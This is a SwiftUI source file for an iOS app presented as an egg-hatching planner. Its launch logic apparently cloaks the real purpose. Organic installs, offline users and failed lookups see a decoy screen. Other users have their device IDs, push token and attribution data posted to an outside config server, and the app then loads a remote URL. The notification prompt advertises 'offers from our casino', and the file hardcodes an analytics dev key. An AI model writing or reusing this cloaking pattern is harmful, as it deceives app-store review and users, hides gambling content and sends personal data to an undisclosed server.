import SwiftUI
import Combine
import Network
import Firebase
import AppsFlyerLib
import UserNotifications

struct AppConstants {
    static let appsFlyerAppID = "6755211254"
    static let appsFlyerDevKey = "ZStMhXEYdQ3oLgoKmgw828"
}

final class HatchDirector: ObservableObject {
    @Published var currentEggPhase: EggPhase = .warming
    @Published var planURL: URL?
    @Published var displayPermissionScreen = false
    
    private var attributionInfo: [String: Any] = [:]
    private var deepLinkInfo: [String: Any] = [:]
    private var subscriptions = Set<AnyCancellable>()
    private let connectivityChecker = NWPathMonitor()
    
    private var firstTimeOpening: Bool {
        !UserDefaults.standard.bool(forKey: "hasEverRunBefore")
    }
    
    enum EggPhase { case warming, hatching, oldNest, noSignal }
    
    init() {
        registerForNotifications()
        monitorConnectivity()
        triggerPhaseEvaluation()
    }
    
    deinit {
        connectivityChecker.cancel()
    }
    
    func triggerPhaseEvaluation() {
        evaluateCurrentPhase()
    }
    
    private func registerForNotifications() {
        NotificationCenter.default
            .publisher(for: Notification.Name("ConversionDataReceived"))
            .compactMap { $0.userInfo?["conversionData"] as? [String: Any] }
            .sink { [weak self] info in
                self?.attributionInfo = info
                self?.evaluateCurrentPhase()
            }
            .store(in: &subscriptions)
        
        NotificationCenter.default
            .publisher(for: Notification.Name("deeplink_values"))
            .compactMap { $0.userInfo?["deeplinksData"] as? [String: Any] }
            .sink { [weak self] info in
                self?.deepLinkInfo = info
            }
            .store(in: &subscriptions)
    }
    
    @objc private func evaluateCurrentPhase() {
        guard !attributionInfo.isEmpty else {
            usePreviousPlan()
            return
        }
        
        if UserDefaults.standard.string(forKey: "app_mode") == "Funtik" {
            goToOldNest()
            return
        }
        
        if firstTimeOpening && attributionInfo["af_status"] as? String == "Organic" {
            startFirstHatchSequence()
            return
        }
        
        if let urlStr = UserDefaults.standard.string(forKey: "temp_url"),
           let url = URL(string: urlStr) {
            planURL = url
            updatePhase(to: .hatching)
            return
        }
        
        if planURL == nil {
            if needToAskForNotifications() {
                displayPermissionScreen = true
            } else {
                loadPlanFromServer()
            }
        }
    }
    
    func userSkippedPermission() {
        UserDefaults.standard.set(Date(), forKey: "last_notification_ask")
        displayPermissionScreen = false
        loadPlanFromServer()
    }
    
    func userAllowedPermission() {
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { [weak self] granted, _ in
            DispatchQueue.main.async {
                UserDefaults.standard.set(granted, forKey: "accepted_notifications")
                if granted {
                    UIApplication.shared.registerForRemoteNotifications()
                } else {
                    UserDefaults.standard.set(true, forKey: "system_close_notifications")
                }
                self?.displayPermissionScreen = false
                self?.loadPlanFromServer()
            }
        }
    }
    
    private func needToAskForNotifications() -> Bool {
        guard !UserDefaults.standard.bool(forKey: "accepted_notifications"),
              !UserDefaults.standard.bool(forKey: "system_close_notifications")
        else { return false }
        
        if let last = UserDefaults.standard.object(forKey: "last_notification_ask") as? Date,
           Date().timeIntervalSince(last) < 259200 {
            return false
        }
        return true
    }
    
    private func startFirstHatchSequence() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            Task { await self.requestOrganicAttribution() }
        }
    }
    
    private func goToOldNest() {
        UserDefaults.standard.set("Funtik", forKey: "app_mode")
        UserDefaults.standard.set(true, forKey: "hasEverRunBefore")
        updatePhase(to: .oldNest)
    }
    
    private func usePreviousPlan() {
        if let saved = UserDefaults.standard.string(forKey: "saved_trail"),
           let url = URL(string: saved) {
            planURL = url
            updatePhase(to: .hatching)
        } else {
            goToOldNest()
        }
    }
    
    private func saveSuccessfulPlan(_ url: String) {
        UserDefaults.standard.set(url, forKey: "saved_trail")
        UserDefaults.standard.set("HenView", forKey: "app_mode")
        UserDefaults.standard.set(true, forKey: "hasEverRunBefore")
    }
    
    private func updatePhase(to phase: EggPhase) {
        DispatchQueue.main.async {
            self.currentEggPhase = phase
        }
    }
}

// MARK: - Network handling in extension
extension HatchDirector {
    private func monitorConnectivity() {
        connectivityChecker.pathUpdateHandler = { [weak self] path in
            if path.status != .satisfied {
                DispatchQueue.main.async {
                    let mode = UserDefaults.standard.string(forKey: "app_mode") ?? ""
                    if mode == "HenView" {
                        self?.updatePhase(to: .noSignal)
                    } else {
                        self?.goToOldNest()
                    }
                }
            }
        }
        connectivityChecker.start(queue: .global())
    }
    
    private func requestOrganicAttribution() async {
        let request = AppsFlyerRequestBuilder()
            .setAppID(AppConstants.appsFlyerAppID)
            .setDevKey(AppConstants.appsFlyerDevKey)
            .setUID(AppsFlyerLib.shared().getAppsFlyerUID())
            .build()
        
        guard let url = request else {
            goToOldNest()
            return
        }
        
        do {
            let (data, resp) = try await URLSession.shared.data(from: url)
            try await handleOrganicResponse(data: data, response: resp)
        } catch {
            goToOldNest()
        }
    }
    
    private func handleOrganicResponse(data: Data, response: URLResponse) async throws {
        guard let http = response as? HTTPURLResponse,
              http.statusCode == 200,
              let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any]
        else {
            goToOldNest()
            return
        }
        
        var combined = json
        for (k, v) in deepLinkInfo where combined[k] == nil {
            combined[k] = v
        }
        
        await MainActor.run {
            attributionInfo = combined
            loadPlanFromServer()
        }
    }
    
    private func loadPlanFromServer() {
        guard let server = URL(string: "https://hattchpllan.com/config.php") else {
            usePreviousPlan()
            return
        }
        
        var payload = attributionInfo
        payload["os"] = "iOS"
        payload["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
        payload["bundle_id"] = "com.hatcinkplanni.HatchPlan"
        payload["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
        payload["store_id"] = "id\(AppConstants.appsFlyerAppID)"
        payload["push_token"] = UserDefaults.standard.string(forKey: "fcm_token") ?? Messaging.messaging().fcmToken
        payload["locale"] = (Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN")
        
        guard let jsonBody = try? JSONSerialization.data(withJSONObject: payload) else {
            usePreviousPlan()
            return
        }
        
        var req = URLRequest(url: server)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.httpBody = jsonBody
        
        URLSession.shared.dataTask(with: req) { [weak self] data, _, err in
            guard let data = data, err == nil,
                  let obj = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                  let ok = obj["ok"] as? Bool, ok,
                  let urlStr = obj["url"] as? String,
                  let finalURL = URL(string: urlStr)
            else {
                self?.usePreviousPlan()
                return
            }
            
            DispatchQueue.main.async {
                self?.saveSuccessfulPlan(urlStr)
                self?.planURL = finalURL
                self?.updatePhase(to: .hatching)
            }
        }.resume()
    }
}

// MARK: - AppsFlyer request builder
private struct AppsFlyerRequestBuilder {
    private var appID = ""
    private var devKey = ""
    private var uid = ""
    private let baseURL = "https://gcdsdk.appsflyer.com/install_data/v4.0/"
    
    func setAppID(_ value: String) -> Self { copy(appID: value) }
    func setDevKey(_ value: String) -> Self { copy(devKey: value) }
    func setUID(_ value: String) -> Self { copy(uid: value) }
    
    func build() -> URL? {
        guard !appID.isEmpty, !devKey.isEmpty, !uid.isEmpty else { return nil }
        var comp = URLComponents(string: baseURL + "id" + appID)!
        comp.queryItems = [
            URLQueryItem(name: "devkey", value: devKey),
            URLQueryItem(name: "device_id", value: uid)
        ]
        return comp.url
    }
    
    private func copy(appID: String = "", devKey: String = "", uid: String = "") -> Self {
        var new = self
        if !appID.isEmpty { new.appID = appID }
        if !devKey.isEmpty { new.devKey = devKey }
        if !uid.isEmpty { new.uid = uid }
        return new
    }
}

struct HatchPlanEntry: View {
    @StateObject private var director = HatchDirector()
    
    var body: some View {
        ZStack {
            Color.black.ignoresSafeArea()
            
            if director.currentEggPhase == .warming || director.displayPermissionScreen {
                HatchWarmScreen()
            }
            
            ActiveHatchContent(director: director)
                .opacity(director.displayPermissionScreen ? 0 : 1)
            
            if director.displayPermissionScreen {
                HatchPermissionView(
                    onAllow: director.userAllowedPermission,
                    onSkip: director.userSkippedPermission
                )
            }
        }
        .onReceive(NotificationCenter.default.publisher(for: UIApplication.didBecomeActiveNotification)) { _ in
            director.triggerPhaseEvaluation()
        }
    }
}

private struct ActiveHatchContent: View {
    @ObservedObject var director: HatchDirector
    
    var body: some View {
        Group {
            switch director.currentEggPhase {
            case .warming:
                EmptyView()
            case .hatching:
                if director.planURL != nil {
                    HatchPlanMainView()
                } else {
                    ContentWrapperView()
                }
            case .oldNest:
                ContentWrapperView()
            case .noSignal:
                NoConnectionScreen()
            }
        }
    }
}

struct HatchWarmScreen: View {
    var body: some View {
        GeometryReader { geo in
            ZStack {
                Image("splash_bg").resizable().scaledToFill().frame(width: geo.size.width, height: geo.size.height).ignoresSafeArea()
                VStack {
                    Spacer()
                    Image("loading_ic").resizable().frame(width: 200, height: 70)
                    EggProgressBar().frame(width: 350)
                    Spacer().frame(height: 80)
                }
            }
        }.ignoresSafeArea()
    }
}

struct EggProgressBar: View {
    @State private var animate = false
    var body: some View {
        GeometryReader { g in
            ZStack(alignment: .leading) {
                Capsule().fill(Color(.systemGray4))
                Capsule().fill(.white)
                    .frame(width: g.size.width * 0.3)
                    .offset(x: animate ? g.size.width : -g.size.width * 0.4)
                    .animation(.linear(duration: 1.6).repeatForever(autoreverses: false), value: animate)
            }
        }
        .frame(height: 5)
        .cornerRadius(2.5)
        .onAppear { animate = true }
    }
}

struct NoConnectionScreen: View {
    var body: some View {
        GeometryReader { geo in
            ZStack {
                Image("internet_bg").resizable().scaledToFill().frame(width: geo.size.width, height: geo.size.height).ignoresSafeArea()
                Image("internet_alert").resizable().frame(width: 300, height: 280)
            }
        }.ignoresSafeArea()
    }
}

struct HatchPermissionView: View {
    let onAllow: () -> Void
    let onSkip: () -> Void
    
    var body: some View {
        GeometryReader { geo in
            let landscape = geo.size.width > geo.size.height
            ZStack {
                Image(landscape ? "land_notifications_bg" : "port_notifications_bg").resizable().scaledToFill().frame(width: geo.size.width, height: geo.size.height).ignoresSafeArea()
                
                VStack(spacing: landscape ? 5 : 10) {
                    Spacer()
                    Text("Allow notifications about bonuses and promos".uppercased())
                        .font(.custom("AlfaSlabOne-Regular", size: 18))
                        .foregroundColor(.white)
                        .multilineTextAlignment(.center)
                        .padding(.horizontal, 30)
                    
                    Text("Stay tuned with best offers from our casino")
                        .font(.custom("AlfaSlabOne-Regular", size: 15))
                        .foregroundColor(.white)
                        .multilineTextAlignment(.center)
                        .padding(.horizontal, 52)
                        .padding(.top, 4)
                    
                    Button(action: onAllow) {
                        Image("allow_btn").resizable().frame(height: 60)
                    }
                    .frame(width: 350)
                    .padding(.top, 12)
                    
                    Button("SKIP", action: onSkip)
                        .font(.custom("AlfaSlabOne-Regular", size: 16))
                        .foregroundColor(.white)
                    
                    Spacer().frame(height: landscape ? 30 : 30)
                }
                .padding(.horizontal, landscape ? 20 : 0)
            }
        }.ignoresSafeArea()
    }
}

#Preview {
    HatchPermissionView(onAllow: {}, onSkip: {})
}
